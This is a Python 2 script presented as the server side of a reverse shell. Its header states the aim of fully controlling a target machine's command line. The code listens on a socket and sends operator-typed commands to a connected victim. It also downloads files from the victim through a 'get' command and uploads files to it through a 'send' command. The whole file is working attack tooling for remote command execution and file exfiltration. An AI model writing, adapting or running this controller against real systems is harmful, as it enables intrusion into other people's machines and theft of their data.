#!/usr/bin/python
#-*- coding:utf-8 -*-

'''
purpose: Creating a reverse shell which can be remotely controled the target
function: fully control cmd of client mechine.
mode:server
creator: Damon.Liu
'''
import socket,sys,os


def socket_create():
    try:
        global host_IP
        global host_Port
        global connect
        host_IP = "127.0.0.1"  #Server ip
        host_Port = 8081
        connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print "socket error code",msg

def socket_bind():
    try:
        global host_IP
        global host_Port
        global connect
        print "Binding socket to port",host_Port
        connect.bind((host_IP,host_Port))
        connect.listen(5)
    except socket.error as msg:
        print "socket error code",msg,"\n"
        print "Reconnecting"
        socket_bind()

def socket_accept():
    comm,add = connect.accept()
    print "Connecting has been establish from",add[0],"port:",add[1]
    send_commands(comm)

def send_commands(comm):
    sys.stdout.write(comm.recv(4092))
    cmd = raw_input()
    while True:
    
        if cmd == "shutdown" or cmd == "exit" :
            comm.send(cmd)
            comm.close()
            connect.close()
            sys.exit()
            
        elif "get" in cmd:
            sys.stdout.write("Input filename you want to create>>")
            filename = raw_input()
            filewrite = open(filename,"wb")
            cmdsize = cmd+" filesize"
            comm.send(cmdsize)
            filesize = comm.recv(1024)
            comm.send(cmd)
            while True:
                bits = comm.recv(1024)            
                if not bits.endswith("Done"):
                    filewrite.write(bits)
                else:
                    filewrite.close()
                    break
            comm.send("Done")
            sys.stdout.write(comm.recv(1024))
            cmd = raw_input()
               
        elif "send" in cmd:
            filename = cmd.split()[1]
            files = open(filename,"rb")
            fileread = files.read(1024)
            comm.send(cmd)
            while fileread != "":
                comm.send(fileread)
                fileread = files.read(1024) 
            files.close()
            comm.send("Done")
            sys.stdout.write(comm.recv(1024))
            cmd = raw_input()
            
        elif len(cmd)>0:
            comm.send(cmd)
            client_response = comm.recv(8192)
            sys.stdout.write(client_response)
            cmd = raw_input() 
            
                
def main():
    socket_create()
    socket_bind()
    socket_accept()
main()


        
        
     

